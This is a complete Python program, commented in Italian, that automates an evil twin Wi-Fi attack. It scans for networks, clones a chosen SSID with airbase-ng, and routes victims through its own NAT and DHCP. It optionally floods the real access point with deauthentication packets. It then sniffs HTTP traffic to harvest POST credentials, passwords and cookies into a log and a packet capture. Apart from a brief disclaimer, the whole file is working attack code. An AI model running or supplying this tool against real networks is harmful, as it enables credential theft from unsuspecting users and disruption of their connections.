#!/usr/bin/env python3
"""
EVIL TWIN FRAMEWORK 3.0 - PROFESSIONAL EDITION
Automated Evil Twin Attack with:
- Automatic network scanning & target selection
- Fake AP creation (airbase-ng)
- Internet passthrough (NAT + DHCP)
- REAL-TIME TRAFFIC INTERCEPTION (HTTP, POST data, credentials)
- PCAP capture of all victim traffic
- Live credential display dashboard
- Full cleanup & system restore

Author: Security Research / Educational Use Only
REQUIRES: 2 interfaces (1 Internet, 1 Wireless for AP)
"""

import os
import sys
import time
import signal
import subprocess
import threading
import re
import netifaces
import tempfile
import select
from datetime import datetime
import queue
import termios
import tty
import atexit
import glob

# ------------------------- SCAPY GLOBALE (obbligatorio) -------------------------
try:
    from scapy.all import *
    from scapy.layers import http
except ImportError:
    print("\n[!] Scapy non installato. Installa con:")
    print("    sudo apt install python3-scapy")
    print("    sudo pip3 install scapy")
    sys.exit(1)

# --------------------------- CONFIGURAZIONE ---------------------------
VERSION = "3.0 Professional"
PCAP_DIR = "/tmp/eviltwin_captures"
LOG_FILE = "/tmp/eviltwin_credentials.log"
CAPTURE_FILE = f"{PCAP_DIR}/victim_traffic.pcap"
INTERCEPT_HTTP = True          # Intercetta traffico HTTP
INTERCEPT_HTTPS = False        # HTTPS richiede SSLstrip (opzionale)
SHOW_POST_DATA = True          # Mostra dati POST in chiaro
SHOW_COOKIES = True           # Mostra cookie HTTP
SAVE_PCAP = True              # Salva tutto il traffico in PCAP

# --------------------------- GLOBALI ---------------------------
internet_iface = None
ap_iface = None
ap_iface_original = None
airbase_pid = None
dnsmasq_pid = None
sniffer_thread = None
cleanup_done = False
at0 = "at0"
target_network = None
capture_queue = queue.Queue()
stop_sniffer = threading.Event()

# --------------------------- UTILITY FUNCTIONS ---------------------------
def run_cmd(cmd, capture=True, check=False, timeout=None):
    """Esegue comando shell con output catturato"""
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        else:
            result = subprocess.run(cmd, shell=True, timeout=timeout)
            return "", "", result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except Exception as e:
        return "", str(e), -1

def check_root():
    """Verifica privilegi root"""
    if os.geteuid() != 0:
        print("\n[!] Questo script DEVE essere eseguito come root!")
        print("    sudo python3 evil_twin_pro.py\n")
        sys.exit(1)

def check_dependencies():
    """Verifica che tutti i tool necessari siano installati"""
    deps = ['airbase-ng', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'tshark']
    missing = []
    for dep in deps:
        _, _, rc = run_cmd(f"which {dep}")
        if rc != 0:
            missing.append(dep)
    if missing:
        print(f"\n[!] Dipendenze mancanti: {', '.join(missing)}")
        print("[*] Installa con:")
        print(f"    sudo apt update && sudo apt install -y {' '.join(missing)}")
        sys.exit(1)

def setup_directories():
    """Crea directory per i capture"""
    os.makedirs(PCAP_DIR, exist_ok=True)
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    # Inizializza file log con header
    with open(LOG_FILE, 'w') as f:
        f.write(f"=== Evil Twin Credential Log - {datetime.now().isoformat()} ===\n")
        f.write("Timestamp | Client MAC | Client IP | Host | Credentials\n")
        f.write("-" * 80 + "\n")

def list_interfaces():
    """Mostra interfacce disponibili con IP"""
    print("\n=== INTERFACCE DISPONIBILI ===")
    ifaces = netifaces.interfaces()
    for iface in ifaces:
        if iface == 'lo':
            continue
        addrs = netifaces.ifaddresses(iface)
        ipv4 = addrs.get(netifaces.AF_INET, [{}])[0].get('addr', 'Nessun IP')
        mac = addrs.get(netifaces.AF_LINK, [{}])[0].get('addr', 'N/A')
        print(f"  {iface:8} - IP: {ipv4:15} MAC: {mac}")

def get_default_interface():
    """Restituisce interfaccia con route predefinita"""
    gateways = netifaces.gateways()
    default = gateways.get('default', {})
    if netifaces.AF_INET in default:
        return default[netifaces.AF_INET][1]
    return None

def check_internet(iface):
    """Verifica connettività Internet sull'interfaccia"""
    print(f"[*] Verifica connettività su {iface}...")
    
    # Controlla gateway
    gateways = netifaces.gateways()
    if netifaces.AF_INET in gateways.get('default', {}):
        gw = gateways['default'][netifaces.AF_INET][0]
        print(f"    Gateway: {gw}")
    else:
        print(f"    [!] Nessun gateway su {iface}")
        return False
    
    # Ping test
    _, _, rc = run_cmd(f"ping -c 1 -W 2 -I {iface} 8.8.8.8")
    if rc == 0:
        print(f"    [✓] Internet OK")
        return True
    else:
        print(f"    [✗] Nessuna connettività")
        return False

def enable_monitor(iface):
    """Attiva modalità monitor sull'interfaccia"""
    print(f"[*] Attivo monitor mode su {iface}...")
    
    # Salva stato originale
    global ap_iface_original
    ap_iface_original = iface
    
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set monitor control")
    run_cmd(f"ip link set {iface} up")
    time.sleep(1)
    
    out, _, _ = run_cmd(f"iwconfig {iface} | grep -i mode")
    if 'monitor' in out.lower():
        print(f"    [✓] Monitor mode attivo")
        return True
    else:
        print(f"    [✗] Fallito")
        return False

def disable_monitor(iface):
    """Ripristina modalità managed"""
    print(f"[*] Ripristino {iface} in modalità managed...")
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set type managed")
    run_cmd(f"ip link set {iface} up")

def scan_networks(iface, scan_time=8):
    """Scansiona reti Wi-Fi con airodump-ng e restituisce lista"""
    print(f"[*] Scansione reti Wi-Fi su {iface} ({scan_time} secondi)...")
    
    with tempfile.NamedTemporaryFile(suffix='.csv', delete=False) as tmp:
        csv_base = tmp.name[:-4]
    
    # Avvia airodump-ng
    proc = subprocess.Popen(
        f"airodump-ng {iface} --output-format csv -w {csv_base} --write-interval 1",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    time.sleep(scan_time)
    proc.terminate()
    time.sleep(1)
    
    # Parsing CSV
    csv_files = glob.glob(f"{csv_base}-*.csv")
    networks = []
    
    if csv_files:
        try:
            with open(csv_files[0], 'r', errors='ignore') as f:
                lines = f.readlines()
            
            for line in lines:
                if line.startswith('BSSID') or not line.strip():
                    continue
                if 'Station' in line:
                    break
                
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    if len(bssid) != 17:
                        continue
                    
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    power = parts[5].strip() if len(parts) > 5 else '0'
                    encryption = parts[6].strip() if len(parts) > 6 else ''
                    
                    if essid and essid != '(not associated)':
                        # Evita duplicati
                        if not any(n['bssid'] == bssid for n in networks):
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid,
                                'power': power,
                                'enc': encryption
                            })
        except Exception as e:
            print(f"    [!] Errore parsing: {e}")
        
        # Pulizia file temporanei
        for f in glob.glob(f"{csv_base}*"):
            try:
                os.remove(f)
            except:
                pass
    
    # Ordina per potenza segnale
    networks.sort(key=lambda x: int(x['power']) if x['power'].isdigit() else 0, reverse=True)
    return networks

def select_target(networks):
    """Menu interattivo per selezione target"""
    print("\n" + "="*60)
    print("          RETI TROVATE - SELEZIONA TARGET")
    print("="*60)
    
    for idx, net in enumerate(networks, 1):
        power = net['power']
        signal_bars = "▂▄▆█"[:min(4, max(1, int((int(power)+100)/12.5)))] if power.isdigit() else "?"
        print(f"{idx:2d}. [{signal_bars:4}] {net['essid'][:30]:30} "
              f"CH: {net['channel']:>3}  {net['bssid']}  "
              f"({net['enc'] if net['enc'] else 'OPEN'})")
    
    while True:
        try:
            choice = int(input("\n[*] Seleziona target (numero): "))
            if 1 <= choice <= len(networks):
                return networks[choice-1]
        except ValueError:
            pass
        print("[!] Numero non valido")

# --------------------------- TRAFFIC INTERCEPTOR --------------------------
class TrafficInterceptor:
    """Interceptor del traffico vittime - live capture e credential harvesting"""
    
    def __init__(self, interface=at0):
        self.interface = interface
        self.running = False
        self.stats = {
            'packets': 0,
            'http_req': 0,
            'credentials': 0,
            'unique_clients': set()
        }
        self.start_time = time.time()
    
    def packet_callback(self, packet):
        """Callback per ogni pacchetto catturato - cuore dell'intercettazione"""
        try:
            self.stats['packets'] += 1
            
            # Salva PCAP se richiesto
            if SAVE_PCAP:
                wrpcap(CAPTURE_FILE, packet, append=True)
            
            # Verifica sia traffico HTTP (porta 80)
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                ip_layer = packet.getlayer(IP)
                tcp_layer = packet.getlayer(TCP)
                
                # Traffico HTTP client -> server (porta 80)
                if tcp_layer.dport == 80 or tcp_layer.sport == 80:
                    self.stats['http_req'] += 1
                    
                    # Estrai payload
                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Informazioni client
                    client_ip = ip_layer.src if tcp_layer.sport != 80 else ip_layer.dst
                    client_mac = self.get_mac_from_ip(client_ip)
                    self.stats['unique_clients'].add(client_mac)
                    
                    # Analizza richiesta HTTP
                    if payload.startswith(('GET', 'POST')):
                        self.analyze_http(payload, client_ip, client_mac, packet)
                        
        except Exception as e:
            # Evita crash su pacchetti malformati
            pass
    
    def get_mac_from_ip(self, ip):
        """Ottiene MAC address dall'IP (arp cache)"""
        if ip.startswith('10.0.0.'):
            # Client dell'AP falso
            out, _, _ = run_cmd(f"arp -n {ip} | grep {ip}")
            match = re.search(r'(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))', out)
            return match.group(0) if match else 'N/A'
        return 'N/A'
    
    def analyze_http(self, payload, client_ip, client_mac, packet):
        """Estrae credenziali e dati sensibili da HTTP"""
        lines = payload.split('\n')
        first_line = lines[0] if lines else ""
        
        # Mostra richiesta HTTP in tempo reale
        print(f"\n\033[36m[HTTP {datetime.now().strftime('%H:%M:%S')}]\033[0m "
              f"{client_ip} -> {first_line[:80]}")
        
        # Analizza POST data (credenziali!)
        if 'POST' in first_line:
            host = None
            path = first_line.split(' ')[1] if len(first_line.split(' ')) > 1 else ''
            
            # Cerca Host header
            for line in lines:
                if line.lower().startswith('host:'):
                    host = line.split(':')[1].strip()
                    break
            
            # Estrai dati POST (ultima riga)
            post_data = lines[-1].strip() if lines[-1] and '=' in lines[-1] else ''
            
            if post_data:
                self.stats['credentials'] += 1
                
                # Log credenziali
                timestamp = datetime.now().isoformat()
                log_entry = f"{timestamp} | {client_mac} | {client_ip} | {host} | {post_data}\n"
                
                with open(LOG_FILE, 'a') as f:
                    f.write(log_entry)
                
                # Mostra in EVIDENZA!
                print(f"\n\033[91m╔══════════════════════════════════════════════════════════╗")
                print(f"║  🔐 CREDENZIALI CATTURATE!                               ║")
                print(f"╠══════════════════════════════════════════════════════════╣")
                print(f"║  Cliente: {client_mac} ({client_ip})")
                print(f"║  Target:  {host}{path}")
                print(f"║  Data:    {post_data}")
                print(f"╚══════════════════════════════════════════════════════════╝\033[0m\n")
                
                # Parsing automatico campi comuni
                self.parse_credentials(post_data, host, client_ip)
        
        # Cookie tracking
        if SHOW_COOKIES:
            for line in lines:
                if line.lower().startswith('cookie:'):
                    print(f"\033[33m  🍪 Cookie: {line[8:].strip()}\033[0m")
    
    def parse_credentials(self, post_data, host, client_ip):
        """Parsing intelligente per username/password"""
        patterns = [
            (r'user[name]*[=:]([^&\s]+)', '👤 Username'),
            (r'login[name]*[=:]([^&\s]+)', '👤 Login'),
            (r'email[=:]([^&\s]+@[^&\s]+)', '📧 Email'),
            (r'pass(word)?[=:]([^&\s]+)', '🔑 Password'),
            (r'pwd[=:]([^&\s]+)', '🔑 Password')
        ]
        
        for pattern, label in patterns:
            match = re.search(pattern, post_data, re.IGNORECASE)
            if match:
                value = match.group(1) if len(match.groups()) == 1 else match.group(2)
                print(f"\033[93m     {label}: {value}\033[0m")
    
    def print_stats(self):
        """Stampa statistiche in tempo reale"""
        elapsed = time.time() - self.start_time
        print("\n" + "="*60)
        print(f"📊 STATISTICHE INTERCETTAZIONE ({datetime.now().strftime('%H:%M:%S')})")
        print("="*60)
        print(f"   Pacchetti catturati: {self.stats['packets']}")
        print(f"   Richieste HTTP:      {self.stats['http_req']}")
        print(f"   Credenziali trovate: {self.stats['credentials']}")
        print(f"   Client unici:        {len(self.stats['unique_clients'])}")
        print(f"   Tempo attivo:        {int(elapsed)} secondi")
        print(f"   PCAP file:           {CAPTURE_FILE if SAVE_PCAP else 'Disabilitato'}")
        print(f"   Log file:            {LOG_FILE}")
        print("="*60)
    
    def start(self):
        """Avvia lo sniffer in background"""
        self.running = True
        print(f"\n\033[92m[*] Avvio intercettazione traffico su {self.interface}...\033[0m")
        print(f"[*] Log credenziali: {LOG_FILE}")
        if SAVE_PCAP:
            print(f"[*] Capture PCAP:    {CAPTURE_FILE}")
        print("[*] In attesa di connessioni vittime...\n")
        
        # Sniff su interfaccia AP
        sniff(iface=self.interface, prn=self.packet_callback, store=False, stop_filter=lambda x: not self.running)
    
    def stop(self):
        """Ferma lo sniffer"""
        self.running = False
        self.print_stats()

# --------------------------- EVIL TWIN CORE ---------------------------
class EvilTwinCore:
    """Gestione access point falso e infrastruttura"""
    
    def __init__(self, internet_iface, ap_iface, target):
        self.internet_iface = internet_iface
        self.ap_iface = ap_iface
        self.target = target
        self.airbase_pid = None
        self.dnsmasq_pid = None
        self.at0 = "at0"
    
    def start_airbase(self):
        """Avvia airbase-ng per creare AP falso"""
        global airbase_pid
        
        ssid = self.target['essid']
        channel = self.target['channel']
        
        print(f"\n[*] Avvio AP falso (SSID: '{ssid}', CH: {channel})...")
        
        # Usa lo stesso SSID del target (Evil Twin)
        proc = subprocess.Popen(
            f"airbase-ng -e '{ssid}' -c {channel} {self.ap_iface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.airbase_pid = proc.pid
        airbase_pid = proc.pid
        print(f"    [✓] airbase-ng avviato (PID: {self.airbase_pid})")
        
        # Attendi creazione at0
        print("[*] Attendo interfaccia at0...")
        for i in range(10):
            time.sleep(1)
            if os.path.exists(f"/sys/class/net/{self.at0}"):
                print(f"    [✓] Interfaccia {self.at0} creata")
                return True
        print("    [✗] Interfaccia at0 non creata!")
        return False
    
    def configure_network(self):
        """Configura rete, IP forwarding, iptables"""
        print("\n[*] Configurazione rete...")
        
        # Configura at0
        run_cmd(f"ifconfig {self.at0} up")
        run_cmd(f"ifconfig {self.at0} 10.0.0.1 netmask 255.255.255.0")
        run_cmd(f"route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
        print("    [✓] IP configurato su at0 (10.0.0.1)")
        
        # IP forwarding
        run_cmd("sysctl -w net.ipv4.ip_forward=1")
        print("    [✓] IP forwarding abilitato")
        
        # Pulisci regole vecchie
        run_cmd(f"iptables -t nat -D POSTROUTING -o {self.internet_iface} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.at0} -o {self.internet_iface} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.internet_iface} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")
        
        # Configura NAT
        run_cmd(f"iptables -t nat -A POSTROUTING -o {self.internet_iface} -j MASQUERADE")
        run_cmd(f"iptables -A FORWARD -i {self.at0} -o {self.internet_iface} -j ACCEPT")
        run_cmd(f"iptables -A FORWARD -i {self.internet_iface} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT")
        run_cmd("iptables -P FORWARD ACCEPT")
        print("    [✓] iptables configurati (NAT attivo)")
        
        return True
    
    def start_dnsmasq(self):
        """Avvia server DHCP/DNS"""
        global dnsmasq_pid
        
        print("\n[*] Avvio dnsmasq (DHCP + DNS)...")
        
        conf_file = "/tmp/eviltwin_dnsmasq.conf"
        with open(conf_file, "w") as f:
            f.write(f"""interface={self.at0}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8
no-resolv
log-queries
log-dhcp
""")
        
        # Uccidi istanze precedenti
        run_cmd("pkill -f 'dnsmasq.*at0' 2>/dev/null")
        
        proc = subprocess.Popen(
            f"dnsmasq -C {conf_file} -d",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.dnsmasq_pid = proc.pid
        dnsmasq_pid = proc.pid
        print(f"    [✓] dnsmasq avviato (PID: {self.dnsmasq_pid})")
        
        return True
    
    def deauth_attack(self, bssid=None, client=None):
        """Lancia deauth attack (opzionale)"""
        if not bssid:
            bssid = self.target['bssid']
        
        print(f"\n[*] Avvio deauthentication attack su {bssid}...")
        
        if client:
            # Deauth specific client
            cmd = f"aireplay-ng --deauth 10 -a {bssid} -c {client} {self.ap_iface}"
            print(f"    Target client: {client}")
        else:
            # Broadcast deauth
            cmd = f"aireplay-ng --deauth 0 -a {bssid} {self.ap_iface}"
        
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("    [✓] Deauth attack avviato (background)")
        
        return True

# --------------------------- CLEANUP ---------------------------
def cleanup():
    """Pulizia completa del sistema"""
    global cleanup_done, airbase_pid, dnsmasq_pid, sniffer_thread, stop_sniffer
    
    if cleanup_done:
        return
    
    print("\n\n[*] AVVIO PULIZIA COMPLETA...")
    
    # Ferma sniffer
    stop_sniffer.set()
    if sniffer_thread and sniffer_thread.is_alive():
        print("[*] Fermo intercettazione traffico...")
        sniffer_thread.join(timeout=2)
    
    # Uccidi processi
    if airbase_pid:
        print(f"[*] Termino airbase-ng (PID: {airbase_pid})...")
        run_cmd(f"kill -9 {airbase_pid} 2>/dev/null")
    
    if dnsmasq_pid:
        print(f"[*] Termino dnsmasq (PID: {dnsmasq_pid})...")
        run_cmd(f"kill -9 {dnsmasq_pid} 2>/dev/null")
    
    time.sleep(1)
    
    # Rimuovi regole iptables
    if internet_iface:
        print("[*] Rimuovo regole iptables...")
        run_cmd(f"iptables -t nat -D POSTROUTING -o {internet_iface} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {at0} -o {internet_iface} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {internet_iface} -o {at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")
    
    # Disabilita forwarding
    run_cmd("sysctl -w net.ipv4.ip_forward=0")
    
    # Ripristina interfaccia AP
    if ap_iface_original:
        disable_monitor(ap_iface_original)
    
    # Rimuovi interfaccia at0
    run_cmd(f"ip link set {at0} down 2>/dev/null")
    run_cmd(f"iw dev {at0} del 2>/dev/null")
    
    # Riavvia NetworkManager
    print("[*] Ripristino NetworkManager...")
    run_cmd("systemctl restart NetworkManager 2>/dev/null")
    run_cmd("rfkill unblock wifi")
    
    print("\n\033[92m[✓] PULIZIA COMPLETATA. Sistema ripristinato.\033[0m")
    
    # Mostra sommario finale
    print("\n" + "="*60)
    print("📁 FILE GENERATI:")
    print(f"   - Log credenziali: {LOG_FILE}")
    if SAVE_PCAP:
        size = os.path.getsize(CAPTURE_FILE) if os.path.exists(CAPTURE_FILE) else 0
        print(f"   - Capture PCAP:    {CAPTURE_FILE} ({size/1024:.1f} KB)")
    print("="*60 + "\n")
    
    cleanup_done = True

def signal_handler(sig, frame):
    """Handler per Ctrl+C"""
    print("\n\n[!] INTERROTTO DALL'UTENTE")
    cleanup()
    sys.exit(0)

# --------------------------- MAIN ---------------------------
def main():
    """Funzione principale"""
    global internet_iface, ap_iface, target_network, sniffer_thread, stop_sniffer
    
    # Banner
    print(f"""
\033[92m
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
║     ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
║     █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
║     ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
║     ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
║                                                               ║
║              EVIL TWIN FRAMEWORK {VERSION}                     ║
║         Professional Wireless Penetration Testing Tool        ║
║                                                               ║
║     ⚠️  SOLO USO EDUCATIVO E TEST AUTORIZZATI ⚠️              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
\033[0m""")
    
    # Verifiche preliminari
    check_root()
    check_dependencies()
    setup_directories()
    
    # Registra cleanup
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Mostra interfacce
    list_interfaces()
    
    # --- SELEZIONE INTERFACCIA INTERNET ---
    default = get_default_interface()
    print(f"\n[+] Interfaccia con Internet rilevata: {default}")
    use_default = input("Usare questa interfaccia? (S/n): ").strip().lower()
    
    if use_default == 'n':
        internet_iface = input("Inserisci nome interfaccia Internet: ").strip()
    else:
        internet_iface = default
    
    if internet_iface not in netifaces.interfaces():
        print(f"[!] Interfaccia {internet_iface} non esiste")
        sys.exit(1)
    
    if not check_internet(internet_iface):
        print("[!] L'interfaccia Internet non ha connettività")
        sys.exit(1)
    
    # --- SELEZIONE INTERFACCIA AP ---
    print("\n--- INTERFACCE WIRELESS DISPONIBILI ---")
    out, _, _ = run_cmd("iw dev | grep Interface | awk '{print $2}'")
    wlans = out.splitlines()
    
    if not wlans:
        print("[!] Nessuna interfaccia wireless trovata")
        sys.exit(1)
    
    for idx, w in enumerate(wlans, 1):
        # Verifica se è l'interfaccia Internet
        note = " (IN USO PER INTERNET)" if w == internet_iface else ""
        print(f"  {idx}. {w}{note}")
    
    choice = input("\nScegli interfaccia per AP falso (numero): ").strip()
    try:
        ap_iface = wlans[int(choice)-1]
        if ap_iface == internet_iface:
            warn = input("[!] Stai usando la stessa interfaccia per Internet e AP. Continuare? (s/N): ")
            if warn.lower() != 's':
                sys.exit(0)
    except:
        print("[!] Scelta non valida")
        sys.exit(1)
    
    # --- SCANSIONE TARGET ---
    if not enable_monitor(ap_iface):
        sys.exit(1)
    
    networks = scan_networks(ap_iface, scan_time=8)
    if not networks:
        print("[!] Nessuna rete trovata")
        disable_monitor(ap_iface)
        sys.exit(1)
    
    target = select_target(networks)
    print(f"\n\033[92m[✓] TARGET SELEZIONATO:\033[0m")
    print(f"    ESSID: {target['essid']}")
    print(f"    BSSID: {target['bssid']}")
    print(f"    Canale: {target['channel']}")
    print(f"    Cifratura: {target['enc'] if target['enc'] else 'OPEN'}")
    
    # --- CONFIGURAZIONE EVIL TWIN ---
    core = EvilTwinCore(internet_iface, ap_iface, target)
    
    # Avvia AP falso
    if not core.start_airbase():
        cleanup()
        sys.exit(1)
    
    # Configura rete
    core.configure_network()
    
    # Avvia DHCP/DNS
    core.start_dnsmasq()
    
    # --- AVVIA INTERCETTAZIONE TRAFFICO ---
    print("\n\033[92m[✓] EVIL TWIN ATTIVO! In attesa vittime...\033[0m")
    print(f"    SSID: {target['essid']} (canale {target['channel']})")
    print(f"    Gateway: 10.0.0.1")
    print(f"    DHCP: 10.0.0.10-100")
    print(f"    DNS: 8.8.8.8\n")
    
    # Opzione deauth
    deauth = input("Eseguire deauth attack? (s/N): ").strip().lower()
    if deauth == 's':
        client = input("Client specifico? (MAC / INVIO per broadcast): ").strip()
        if client:
            core.deauth_attack(client=client)
        else:
            core.deauth_attack()
    
    # Avvia sniffer in thread separato
    stop_sniffer.clear()
    interceptor = TrafficInterceptor(interface=at0)
    sniffer_thread = threading.Thread(target=interceptor.start, daemon=True)
    sniffer_thread.start()
    
    # Menu interattivo
    print("\n\033[93m" + "="*60)
    print("          🎯 MODALITÀ INTERCETTAZIONE ATTIVA 🎯")
    print("="*60)
    print("   [1] Mostra statistiche")
    print("   [2] Mostra ultime credenziali")
    print("   [3] Apri log file")
    print("   [4] Riavvia deauth")
    print("   [5] Ferma attacco e pulisci")
    print("="*60 + "\033[0m")
    
    try:
        while True:
            cmd = input("evil-twin> ").strip()
            
            if cmd == '1':
                interceptor.print_stats()
            elif cmd == '2':
                print("\n--- ULTIME CREDENZIALI ---")
                run_cmd(f"tail -20 {LOG_FILE}")
            elif cmd == '3':
                run_cmd(f"less {LOG_FILE}")
            elif cmd == '4':
                core.deauth_attack()
            elif cmd == '5':
                break
            elif cmd == '':
                continue
            else:
                print("[!] Comando non riconosciuto")
                
    except KeyboardInterrupt:
        pass
    
    cleanup()
    print("\n[✓] Uscita.")

if __name__ == "__main__":
    main()